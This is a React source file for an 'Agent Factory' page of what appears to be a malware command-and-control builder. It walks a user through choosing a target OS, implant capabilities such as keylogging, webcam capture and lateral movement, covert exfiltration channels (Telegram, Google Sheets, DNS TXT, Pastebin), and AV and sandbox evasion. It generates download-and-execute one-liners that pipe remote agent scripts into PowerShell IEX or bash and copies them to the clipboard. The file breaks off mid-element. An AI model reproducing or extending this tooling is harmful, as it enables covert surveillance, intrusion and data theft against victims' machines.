'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import PageLayout from '../components/PageLayout';
import LoadingScreen from '../components/LoadingScreen';
import { User, parseUserFromCookie, removeCookie } from '../utils/auth';

interface AgentCapabilities {
  systemAccess: {
    fileSystemAccess: boolean;
    registryManipulation: boolean;
    processManagement: boolean;
  };
  surveillance: {
    screenshotCapture: boolean;
    keylogging: boolean;
    webcamAccess: boolean;
  };
  network: {
    networkScanning: boolean;
    proxyPivot: boolean;
    lateralMovement: boolean;
  };
}

interface TransportChannels {
  primary: {
    github: boolean;
    telegram: boolean;
    googleDrive: boolean;
  };
  fallback: {
    dnsTxt: boolean;
    pastebin: boolean;
  };
}

interface BuildConfig {
  deliveryFormat: string;
  obfuscationLevel: string;
  persistenceMechanism: boolean;
  avEvasion: boolean;
  sandboxEvasion: boolean;
}

export default function AgentFactoryPage() {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const [selectedPlatform, setSelectedPlatform] = useState<string>('');
  const [currentStep, setCurrentStep] = useState(1);
  const [capabilities, setCapabilities] = useState<AgentCapabilities>({
    systemAccess: {
      fileSystemAccess: true,
      registryManipulation: true,
      processManagement: false,
    },
    surveillance: {
      screenshotCapture: true,
      keylogging: false,
      webcamAccess: false,
    },
    network: {
      networkScanning: true,
      proxyPivot: false,
      lateralMovement: false,
    },
  });
  const [transportChannels, setTransportChannels] = useState<TransportChannels>({
    primary: {
      github: false,
      telegram: false,
      googleDrive: false,
    },
    fallback: {
      dnsTxt: false,
      pastebin: false,
    },
  });
  const [buildConfig, setBuildConfig] = useState<BuildConfig>({
    deliveryFormat: '',
    obfuscationLevel: 'Medium (Balanced)',
    persistenceMechanism: true,
    avEvasion: true,
    sandboxEvasion: false,
  });
  const [deliveryFormats, setDeliveryFormats] = useState<string[]>([]);
  const [loadingFormats, setLoadingFormats] = useState(false);
  const [lolbinCommands, setLolbinCommands] = useState<Record<string, string>>({});
  const router = useRouter();

  useEffect(() => {
    // Check if user is logged in via cookies
    const userInfo = parseUserFromCookie();
    if (!userInfo) {
      router.push('/');
      return;
    }

    setUser(userInfo);
    setLoading(false);
  }, [router]);

  // Load delivery formats from API
  useEffect(() => {
    if (currentStep === 4) {
      loadDeliveryFormats();
    }
  }, [currentStep]);



  const loadDeliveryFormats = async () => {
    setLoadingFormats(true);
    try {
      if (!selectedPlatform) {
        console.log('No platform selected, using fallback LOLBin options');
        setDeliveryFormats([
          'PowerShell LOLBin',
          'CMD/Batch LOLBin',
          'Regsvr32 LOLBin',
          'Rundll32 LOLBin',
          'MSBuild LOLBin',
          'Certutil LOLBin',
          'Wmic LOLBin',
          'Bcdedit LOLBin'
        ]);
        return;
      }

      // Build query parameters
      const params = new URLSearchParams({
        platform: selectedPlatform,
        username: user?.username || 'admin'
      });

      const response = await fetch(`http://localhost:5000/delivery-formats?${params}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      });

      if (response.ok) {
        const result = await response.json();
        if (result.status === 'success') {
          console.log('Loaded LOLBin options:', result);
          setDeliveryFormats(result.formats);
          setLolbinCommands(result.lolbin_commands || {});
          // Set first format as default if none selected
          if (!buildConfig.deliveryFormat && result.formats.length > 0) {
            setBuildConfig(prev => ({ ...prev, deliveryFormat: result.formats[0] }));
          }
        }
      }
    } catch (error) {
      console.error('Error loading LOLBin options:', error);
      // Fallback LOLBin options if API fails
      setDeliveryFormats([
        'PowerShell LOLBin',
        'CMD/Batch LOLBin',
        'Regsvr32 LOLBin',
        'Rundll32 LOLBin',
        'MSBuild LOLBin',
        'Certutil LOLBin',
        'Wmic LOLBin',
        'Bcdedit LOLBin'
      ]);
    } finally {
      setLoadingFormats(false);
    }
  };



  const handleLogout = () => {
    removeCookie('user');
    router.push('/');
  };

  const handleCapabilityChange = (category: keyof AgentCapabilities, capability: string, value: boolean) => {
    setCapabilities(prev => ({
      ...prev,
      [category]: {
        ...prev[category],
        [capability]: value,
      },
    }));
  };

  const handleTransportChange = (category: keyof TransportChannels, channel: string, value: boolean) => {
    if (value) {
      // If selecting a channel, deselect all others first
      setTransportChannels(prev => {
        const newState = {
          primary: { ...prev.primary },
          fallback: { ...prev.fallback }
        };
        
        // Deselect all channels first
        Object.keys(newState.primary).forEach(key => {
          (newState.primary as any)[key] = false;
        });
        Object.keys(newState.fallback).forEach(key => {
          (newState.fallback as any)[key] = false;
        });
        
        // Select only the clicked channel
        (newState[category] as any)[channel] = true;
        
        return newState;
      });
    } else {
      // If deselecting, just set to false
    setTransportChannels(prev => ({
      ...prev,
      [category]: {
        ...prev[category],
          [channel]: false,
      },
    }));
    }
  };

  const handleBuildConfigChange = (setting: keyof BuildConfig, value: string | boolean) => {
    setBuildConfig(prev => ({
      ...prev,
      [setting]: value,
    }));
  };

  const handleNext = () => {
    if (currentStep === 3) {
      // Check if exactly one transport channel is selected
      const selectedChannels = Object.values(transportChannels.primary).filter(Boolean).length + 
                              Object.values(transportChannels.fallback).filter(Boolean).length;
      
      if (selectedChannels !== 1) {
        alert('Please select exactly one transport channel before proceeding.');
        return;
      }
    }
    
    if (currentStep < 4) {
      setCurrentStep(currentStep + 1);
    }
  };

  const handlePrevious = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
    }
  };

  const handleBuildAgent = async () => {
    try {
      const selectedChannel = getSelectedChannelName();
      if (!selectedChannel || !selectedPlatform || !buildConfig.deliveryFormat) {
        alert('Please complete all steps before building agent');
        return;
      }

    console.log('Building agent for platform:', selectedPlatform);
    console.log('Capabilities:', capabilities);
    console.log('Transport:', transportChannels);
    console.log('Build config:', buildConfig);

      // Prepare agent data
      const agentData = {
        platform: selectedPlatform,
        transport_channel: selectedChannel.channel,
        lolbin_format: buildConfig.deliveryFormat,
        username: user?.username || 'admin'
      };

      console.log('Sending agent data:', agentData);

      // Call backend to create agent
      const response = await fetch('http://localhost:5000/create-agent', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(agentData),
      });

      if (response.ok) {
        const result = await response.json();
        if (result.status === 'success') {
          console.log('Agent created successfully:', result);
          
          // Show success message with agent details
          alert(`Agent created successfully!\n\nUUID: ${result.agent_uuid}\nPlatform: ${result.platform}\nTransport: ${result.transport_channel}\nLOLBin: ${result.lolbin_format}\n\nPowerShell command has been generated and is ready to use.`);
          
          // You can also display the PowerShell command in a modal or copy it to clipboard
          if (result.powershell_command) {
            navigator.clipboard.writeText(result.powershell_command);
            console.log('PowerShell command copied to clipboard');
          }
          
          // Agent created successfully
          console.log('Agent created successfully!');
        } else {
          alert(`Error creating agent: ${result.message}`);
        }
      } else {
        const errorData = await response.json();
        alert(`Error creating agent: ${errorData.message || 'Unknown error'}`);
      }
    } catch (error) {
      console.error('Error building agent:', error);
      alert('Error building agent. Please check console for details.');
    }
  };

  const generateCommand = () => {
    const selectedChannel = getSelectedChannelName();
    if (!selectedChannel) return 'No transport channel selected';

    if (selectedPlatform === 'windows') {
      if (selectedChannel.channel === 'github') {
      return `powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/zerotrace/agents/main/windows-agent.ps1')"`;
      } else if (selectedChannel.channel === 'telegram') {
        return `powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/zerotrace/agents/main/telegram-windows-agent.ps1')"`;
      } else if (selectedChannel.channel === 'googleDrive') {
        return `powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/zerotrace/agents/main/sheets-windows-agent.ps1')"`;
      }
    } else if (selectedPlatform === 'linux') {
      if (selectedChannel.channel === 'github') {
      return `curl -s https://raw.githubusercontent.com/zerotrace/agents/main/linux-agent.sh | bash`;
      } else if (selectedChannel.channel === 'telegram') {
        return `curl -s https://raw.githubusercontent.com/zerotrace/agents/main/telegram-linux-agent.sh | bash`;
      } else if (selectedChannel.channel === 'googleDrive') {
        return `curl -s https://raw.githubusercontent.com/zerotrace/agents/main/sheets-linux-agent.sh | bash`;
      }
    } else if (selectedPlatform === 'macos') {
      if (selectedChannel.channel === 'github') {
      return `curl -s https://raw.githubusercontent.com/zerotrace/agents/main/macos-agent.sh | bash`;
      } else if (selectedChannel.channel === 'telegram') {
        return `curl -s https://raw.githubusercontent.com/zerotrace/agents/main/telegram-macos-agent.sh | bash`;
      } else if (selectedChannel.channel === 'googleDrive') {
        return `curl -s https://raw.githubusercontent.com/zerotrace/agents/main/sheets-macos-agent.sh | bash`;
      }
    } else if (selectedPlatform === 'android') {
      if (selectedChannel.channel === 'github') {
      return `wget -qO- https://raw.githubusercontent.com/zerotrace/agents/main/android-agent.sh | sh`;
      } else if (selectedChannel.channel === 'telegram') {
        return `wget -qO- https://raw.githubusercontent.com/zerotrace/agents/main/telegram-android-agent.sh | sh`;
      } else if (selectedChannel.channel === 'googleDrive') {
        return `wget -qO- https://raw.githubusercontent.com/zerotrace/agents/main/sheets-android-agent.sh | sh`;
      }
    }
    return '';
  };

  const getSelectedChannelName = () => {
    for (const [category, channels] of Object.entries(transportChannels)) {
      for (const [channel, selected] of Object.entries(channels)) {
        if (selected) {
          return { category, channel };
        }
      }
    }
    return null;
  };

  const getLolbinCommand = (format: string) => {
    return lolbinCommands[format] || 'No command available';
  };

  const renderStepContent = () => {
    const selectedChannel = getSelectedChannelName();
    
    switch (currentStep) {
      case 1:
        return (
          <>
            {/* Section Heading */}
            <h2 className="text-2xl font-mono font-semibold text-white mb-6">Select Target Platform</h2>

            {/* Platform Selection Cards */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
              {/* Windows Card */}
              <div 
                className={`bg-gray-900 rounded-lg p-6 border-2 cursor-pointer transition-all duration-200 hover:border-green-500 ${
                  selectedPlatform === 'windows' ? 'border-green-500 bg-green-900/20' : 'border-gray-700 hover:bg-gray-800'
                }`}
                onClick={() => setSelectedPlatform('windows')}
              >
                <div className="text-center">
                  <div className="text-4xl mb-4">🖥️</div>
                  <h3 className="text-xl font-mono font-bold text-white mb-2">Windows</h3>
                  <p className="text-gray-400 font-mono text-sm">10, 11, Server</p>
                  {selectedPlatform === 'windows' && (
                    <div className="mt-4 text-green-400 text-sm font-mono">✓ Selected</div>
                  )}
                </div>
              </div>

              {/* Linux Card */}
              <div 
                className={`bg-gray-900 rounded-lg p-6 border-2 cursor-pointer transition-all duration-200 hover:border-green-500 ${
                  selectedPlatform === 'linux' ? 'border-green-500 bg-green-900/20' : 'border-gray-700 hover:bg-gray-800'
                }`}
                onClick={() => setSelectedPlatform('linux')}
              >
                <div className="text-center">
                  <div className="text-4xl mb-4">🐧</div>
                  <h3 className="text-xl font-mono font-bold text-white mb-2">Linux</h3>
                  <p className="text-gray-400 font-mono text-sm">Ubuntu, CentOS, Debian</p>
                  {selectedPlatform === 'linux' && (
                    <div className="mt-4 text-green-400 text-sm font-mono">✓ Selected</div>
                  )}
                </div>
              </div>

              {/* macOS Card */}
              <div 
                className={`bg-gray-900 rounded-lg p-6 border-2 cursor-pointer transition-all duration-200 hover:border-green-500 ${
                  selectedPlatform === 'macos' ? 'border-green-500 bg-green-900/20' : 'border-gray-700 hover:bg-gray-800'
                }`}
                onClick={() => setSelectedPlatform('macos')}
              >
                <div className="text-center">
                  <div className="text-4xl mb-4">🍎</div>
                  <h3 className="text-xl font-mono font-bold text-white mb-2">macOS</h3>
                  <p className="text-gray-400 font-mono text-sm">Monterey, Ventura, Sonoma</p>
                  {selectedPlatform === 'macos' && (
                    <div className="mt-4 text-green-400 text-sm font-mono">✓ Selected</div>
                  )}
                </div>
              </div>

              {/* Android Card */}
              <div 
                className={`bg-gray-900 rounded-lg p-6 border-2 cursor-pointer transition-all duration-200 hover:border-green-500 ${
                  selectedPlatform === 'android' ? 'border-green-500 bg-green-900/20' : 'border-gray-700 hover:bg-gray-800'
                }`}
                onClick={() => setSelectedPlatform('android')}
              >
                <div className="text-center">
                  <div className="text-4xl mb-4">📱</div>
                  <h3 className="text-xl font-mono font-bold text-white mb-2">Android</h3>
                  <p className="text-gray-400 font-mono text-sm">API 21+</p>
                  {selectedPlatform === 'android' && (
                    <div className="mt-4 text-green-400 text-sm font-mono">✓ Selected</div>
                  )}
                </div>
              </div>
            </div>
          </>
        );

      case 2:
        return (
          <>
            {/* Section Heading */}
            <h2 className="text-2xl font-mono font-semibold text-white mb-6">Agent Capabilities</h2>

            {/* Capabilities Grid */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
              {/* System Access */}
              <div className="bg-gray-900 rounded-lg p-6 border border-gray-700">
                <h3 className="text-lg font-mono font-semibold text-blue-400 mb-4">System Access</h3>
                <div className="space-y-3">
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.systemAccess.fileSystemAccess}
                      onChange={(e) => handleCapabilityChange('systemAccess', 'fileSystemAccess', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">File System Access</span>
                  </label>
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.systemAccess.registryManipulation}
                      onChange={(e) => handleCapabilityChange('systemAccess', 'registryManipulation', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Registry Manipulation</span>
                  </label>
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.systemAccess.processManagement}
                      onChange={(e) => handleCapabilityChange('systemAccess', 'processManagement', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Process Management</span>
                  </label>
                </div>
              </div>

              {/* Surveillance */}
              <div className="bg-gray-900 rounded-lg p-6 border border-gray-700">
                <h3 className="text-lg font-mono font-semibold text-blue-400 mb-4">Surveillance</h3>
                <div className="space-y-3">
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.surveillance.screenshotCapture}
                      onChange={(e) => handleCapabilityChange('surveillance', 'screenshotCapture', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Screenshot Capture</span>
                  </label>
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.surveillance.keylogging}
                      onChange={(e) => handleCapabilityChange('surveillance', 'keylogging', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Keylogging</span>
                  </label>
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.surveillance.webcamAccess}
                      onChange={(e) => handleCapabilityChange('surveillance', 'webcamAccess', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Webcam Access</span>
                  </label>
                </div>
              </div>

              {/* Network */}
              <div className="bg-gray-900 rounded-lg p-6 border border-gray-700">
                <h3 className="text-lg font-mono font-semibold text-blue-400 mb-4">Network</h3>
                <div className="space-y-3">
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.network.networkScanning}
                      onChange={(e) => handleCapabilityChange('network', 'networkScanning', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Network Scanning</span>
                  </label>
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.network.proxyPivot}
                      onChange={(e) => handleCapabilityChange('network', 'proxyPivot', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Proxy/Pivot</span>
                  </label>
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.network.lateralMovement}
                      onChange={(e) => handleCapabilityChange('network', 'lateralMovement', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Lateral Movement</span>
                  </label>
                </div>
              </div>
            </div>
          </>
        );

      case 3:
        return (
          <>
            {/* Section Heading */}
            <h2 className="text-2xl font-mono font-semibold text-white mb-6">Transport Configuration</h2>
            
            {/* Selection Status */}
            {selectedChannel && (
              <div className="mb-6 p-4 bg-green-900/20 border border-green-500 rounded-lg">
                <div className="flex items-center space-x-3">
                  <span className="text-green-400 text-xl">✅</span>
                  <div>
                    <div className="font-mono font-semibold text-green-400">
                      Selected: {selectedChannel.channel.charAt(0).toUpperCase() + selectedChannel.channel.slice(1)} 
                      ({selectedChannel.category === 'primary' ? 'Primary' : 'Fallback'} Channel)
                    </div>
                    <div className="text-green-300 text-sm">
                      You can now proceed to the Build Configuration step
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Transport Channels Grid */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8">
              {/* Primary Channels */}
              <div className="bg-gray-900 rounded-lg p-6 border border-gray-700">
                <h3 className="text-lg font-mono font-semibold text-blue-400 mb-4">Primary Channels</h3>
                <div className="space-y-3">
                  {/* GitHub Channel */}
                  <div 
                    className={`p-3 rounded-lg border-2 cursor-pointer transition-all duration-200 ${
                      transportChannels.primary.github 
                        ? 'border-green-500 bg-green-900/20' 
                        : 'border-gray-600 hover:border-gray-500 hover:bg-gray-800'
                    }`}
                    onClick={() => handleTransportChange('primary', 'github', !transportChannels.primary.github)}
                  >
                    <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-3">
                        <div className="text-2xl">🐙</div>
                        <div>
                          <div className="font-mono font-semibold text-white">GitHub</div>
                          <div className="text-xs text-gray-400">Repository-based communication</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-green-400 font-mono text-sm font-bold">98.2%</div>
                        <div className="text-xs text-gray-400">Success Rate</div>
                      </div>
                    </div>
                    {transportChannels.primary.github && (
                      <div className="mt-2 text-green-400 text-xs font-mono">✓ Selected</div>
                    )}
                    </div>

                  {/* Telegram Channel */}
                  <div 
                    className={`p-3 rounded-lg border-2 cursor-pointer transition-all duration-200 ${
                      transportChannels.primary.telegram 
                        ? 'border-green-500 bg-green-900/20' 
                        : 'border-gray-600 hover:border-gray-500 hover:bg-gray-800'
                    }`}
                    onClick={() => handleTransportChange('primary', 'telegram', !transportChannels.primary.telegram)}
                  >
                    <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-3">
                        <div className="text-2xl">📱</div>
                        <div>
                          <div className="font-mono font-semibold text-white">Telegram</div>
                          <div className="text-xs text-gray-400">Bot-based messaging</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-green-400 font-mono text-sm font-bold">99.1%</div>
                        <div className="text-xs text-gray-400">Success Rate</div>
                      </div>
                    </div>
                    {transportChannels.primary.telegram && (
                      <div className="mt-2 text-green-400 text-xs font-mono">✓ Selected</div>
                    )}
                    </div>

                  {/* Google Sheets Channel */}
                  <div 
                    className={`p-3 rounded-lg border-2 cursor-pointer transition-all duration-200 ${
                      transportChannels.primary.googleDrive 
                        ? 'border-green-500 bg-green-900/20' 
                        : 'border-gray-600 hover:border-gray-500 hover:bg-gray-800'
                    }`}
                    onClick={() => handleTransportChange('primary', 'googleDrive', !transportChannels.primary.googleDrive)}
                  >
                    <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-3">
                        <div className="text-2xl">📊</div>
                        <div>
                          <div className="font-mono font-semibold text-white">Google Sheets</div>
                          <div className="text-xs text-gray-400">Spreadsheet-based data exfiltration</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-green-400 font-mono text-sm font-bold">96.7%</div>
                        <div className="text-xs text-gray-400">Success Rate</div>
                      </div>
                    </div>
                    {transportChannels.primary.googleDrive && (
                      <div className="mt-2 text-green-400 text-xs font-mono">✓ Selected</div>
                    )}
                  </div>

                  {/* Custom Channel Button */}
                  <div className="p-3 rounded-lg border-2 border-dashed border-gray-600 hover:border-gray-500 hover:bg-gray-800 cursor-pointer transition-all duration-200">
                    <div className="flex items-center justify-center space-x-3 text-gray-400 hover:text-white">
                      <div className="text-2xl">➕</div>
                      <div className="font-mono font-semibold">Add Custom Channel</div>
                    </div>
                    <div className="text-center text-xs text-gray-500 mt-1">Configure custom transport method</div>
                    </div>
                </div>
              </div>

              {/* Fallback Channels */}
              <div className="bg-gray-900 rounded-lg p-6 border border-gray-700">
                <h3 className="text-lg font-mono font-semibold text-blue-400 mb-4">Fallback Channels</h3>
                <div className="space-y-3">
                  {/* DNS TXT Channel */}
                  <div 
                    className={`p-3 rounded-lg border-2 cursor-pointer transition-all duration-200 ${
                      transportChannels.fallback.dnsTxt 
                        ? 'border-green-500 bg-green-900/20' 
                        : 'border-gray-600 hover:border-gray-500 hover:bg-gray-800'
                    }`}
                    onClick={() => handleTransportChange('fallback', 'dnsTxt', !transportChannels.fallback.dnsTxt)}
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-3">
                        <div className="text-2xl">🌐</div>
                        <div>
                          <div className="font-mono font-semibold text-white">DNS TXT</div>
                          <div className="text-xs text-gray-400">DNS record exfiltration</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-green-400 font-mono text-sm font-bold">99.8%</div>
                        <div className="text-xs text-gray-400">Success Rate</div>
                      </div>
                    </div>
                    {transportChannels.fallback.dnsTxt && (
                      <div className="mt-2 text-green-400 text-xs font-mono">✓ Selected</div>
                    )}
                  </div>

                  {/* Pastebin Channel */}
                  <div 
                    className={`p-3 rounded-lg border-2 cursor-pointer transition-all duration-200 ${
                      transportChannels.fallback.pastebin 
                        ? 'border-green-500 bg-green-900/20' 
                        : 'border-gray-600 hover:border-gray-500 hover:bg-gray-800'
                    }`}
                    onClick={() => handleTransportChange('fallback', 'pastebin', !transportChannels.fallback.pastebin)}
                  >
                    <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-3">
                        <div className="text-2xl">📝</div>
                        <div>
                          <div className="font-mono font-semibold text-white">Pastebin</div>
                          <div className="text-xs text-gray-400">Text-based data sharing</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-green-400 font-mono text-sm font-bold">85.4%</div>
                        <div className="text-xs text-gray-400">Success Rate</div>
                      </div>
                    </div>
                    {transportChannels.fallback.pastebin && (
                      <div className="mt-2 text-green-400 text-xs font-mono">✓ Selected</div>
                    )}
                  </div>

                  {/* Custom Fallback Button */}
                  <div className="p-3 rounded-lg border-2 border-dashed border-gray-600 hover:border-gray-500 hover:bg-gray-800 cursor-pointer transition-all duration-200">
                    <div className="flex items-center justify-center space-x-3 text-gray-400 hover:text-white">
                      <div className="text-2xl">➕</div>
                      <div className="font-mono font-semibold">Add Custom Fallback</div>
                    </div>
                    <div className="text-center text-xs text-gray-500 mt-1">Configure custom fallback method</div>
                  </div>
                </div>
              </div>
                    </div>

            {/* Selection Instructions */}
            <div className="bg-blue-900/20 border border-blue-500 rounded-lg p-4">
                    <div className="flex items-center space-x-3">
                <span className="text-blue-400 text-xl">ℹ️</span>
                <div>
                  <div className="font-mono font-semibold text-blue-400">Single Channel Selection Required</div>
                  <div className="text-blue-300 text-sm">
                    Please select exactly one transport channel. You can choose from Primary or Fallback channels. 
                    Only one channel can be active at a time for optimal agent performance.
                    </div>
                </div>
              </div>
            </div>
          </>
        );

      case 4:
        return (
          <>
            {/* Section Heading */}
            <h2 className="text-2xl font-mono font-semibold text-white mb-6">Build Configuration</h2>

            {/* Selected Transport Channel Display */}
            {selectedChannel && (
              <div className="mb-6 p-4 bg-blue-900/20 border border-blue-500 rounded-lg">
                <div className="flex items-center space-x-3">
                  <span className="text-blue-400 text-xl">
                    {selectedChannel.channel === 'github' ? '🐙' : 
                     selectedChannel.channel === 'telegram' ? '📱' : 
                     selectedChannel.channel === 'googleDrive' ? '📊' : '🌐'}
                  </span>
                  <div>
                    <div className="font-mono font-semibold text-blue-400">
                      Transport Channel: {selectedChannel.channel.charAt(0).toUpperCase() + selectedChannel.channel.slice(1)} 
                      ({selectedChannel.category === 'primary' ? 'Primary' : 'Fallback'})
                    </div>
                    <div className="text-blue-300 text-sm">
                      Agent will be configured to use {selectedChannel.channel} for communication
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Build Configuration Grid */}
            <div className="grid grid-cols-1 gap-6 mb-8">
              {/* Build Options */}
              <div className="bg-gray-900 rounded-lg p-6 border border-gray-700">
                <h3 className="text-lg font-mono font-semibold text-blue-400 mb-4">LOLBin Options</h3>
                <div className="space-y-4">
                  <div>
                    <label className="block text-gray-300 font-mono text-sm mb-2">Select LOLBin</label>
                    {loadingFormats ? (
                      <div className="w-full bg-gray-800 border border-gray-600 rounded px-3 py-2 text-gray-400 text-sm font-mono">
                        Loading LOLBin options...
                      </div>
                    ) : (
                    <select
                      value={buildConfig.deliveryFormat}
                      onChange={(e) => handleBuildConfigChange('deliveryFormat', e.target.value)}
                      className="w-full bg-gray-800 border border-gray-600 rounded px-3 py-2 text-white text-sm font-mono focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500"
                    >
                        {deliveryFormats.map((format) => (
                          <option key={format} value={format}>{format}</option>
                        ))}
                    </select>
                    )}
              </div>

                  {/* LOLBin Command Display */}
                  {buildConfig.deliveryFormat && (
                    <div className="space-y-3">
                  <div className="bg-gray-800 rounded p-3 border border-gray-600">
                        <div className="text-xs text-gray-400 mb-2 font-mono">LOLBin Command:</div>
                    <textarea
                          value={getLolbinCommand(buildConfig.deliveryFormat)}
                      readOnly
                      className="w-full h-24 bg-transparent text-green-400 font-mono text-sm resize-none focus:outline-none"
                    />
                        <div className="flex space-x-3 mt-3">
                          <button 
                            onClick={() => navigator.clipboard.writeText(getLolbinCommand(buildConfig.deliveryFormat))}
                            className="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded font-mono text-sm transition-colors"
                          >
                            COPY COMMAND
                    </button>
                    <button className="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded font-mono text-sm transition-colors flex items-center space-x-2">
                      <span>QR Code</span>
                      <span className="text-lg">📱</span>
                    </button>
                  </div>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </div>
          </>
        );

      default:
        return null;
    }
  };

  if (loading) {
    return <LoadingScreen message="Loading Agent Factory..." />;
  }

  if (!user) {
    return null;
  }

  return (
    <PageLayout user={user} currentPage="agentfactory" onLogout={handleLogout}>
      {/* Main Content Area */}
      <main className="flex-1 p-6 bg-gray-950 overflow-auto">
        {/* Page Title */}
        <div className="mb-8">
          <h1 className="text-4xl font-mono font-bold text-green-400 mb-4">Agent Factory</h1>
          
          {/* Progress Steps */}
          <div className="flex items-center space-x-8 mb-8">
            <div className="flex items-center space-x-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center font-mono font-bold text-sm ${
                currentStep >= 1 ? 'bg-green-500 text-black' : 'bg-gray-700 text-gray-400'
              }`}>
                1
              </div>
              <span className={`font-mono text-sm ${currentStep >= 1 ? 'text-green-400' : 'text-gray-500'}`}>
                Platform
              </span>
            </div>
            
            <div className="flex items-center space-x-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center font-mono font-bold text-sm ${
                currentStep >= 2 ? 'bg-green-500 text-black' : 'bg-gray-700 text-gray-400'
              }`}>
                2
              </div>
              <span className={`font-mono text-sm ${currentStep >= 2 ? 'text-green-400' : 'text-gray-500'}`}>
                Capabilities
              </span>
            </div>
            
            <div className="flex items-center space-x-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center font-mono font-bold text-sm ${
                currentStep >= 3 ? 'bg-green-500 text-black' : 'bg-gray-700 text-gray-400'
              }`}>
                3
              </div>
              <span className={`font-mono text-sm ${currentStep >= 3 ? 'text-green-400' : 'text-gray-500'}`}>
                Transport
              </span>
            </div>
            
            <div className="flex items-center space-x-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center font-mono font-bold text-sm ${
                currentStep >= 4 ? 'bg-green-500 text-black' : 'bg-gray-700 text-gray-400'
              }`}>
                4
              </div>
              <span className={`font-mono text-sm ${currentStep >= 4 ? 'text-green-400' : 'text-gray-500'}`}>
                Build
              </span>
            </div>
          </div>

          {/* Step Content */}
          {renderStepContent()}
        </div>



        {/* Navigation Buttons */}
        <div className="flex items-center justify-between">
          <button
            onClick={handlePrevious}
            disabled={currentStep === 1}
            className={`px-6 py-3 rounded-lg font-mono font-semibold transition-all duration-200 ${
              currentStep === 1 
                ? 'bg-gray-700 text-gray-500 cursor-not-allowed' 
                : 'bg-gray-600 hover:bg-gray-500 text-white'
            }`}
          >
            PREVIOUS
          </button>

          <button
            onClick={handleNext}
            disabled={currentStep === 4}
            className={`px-6 py-3 rounded-lg font-mono font-semibold transition-all duration-200 ${
              currentStep === 4
                ? 'bg-gray-700 text-gray-500 cursor-not-allowed'
                : 'bg-green-600 hover:bg-green-700 text-white'
            }`}
          >
            NEXT
          </button>

          <button
            onClick={handleBuildAgent}
            disabled={currentStep !== 4}
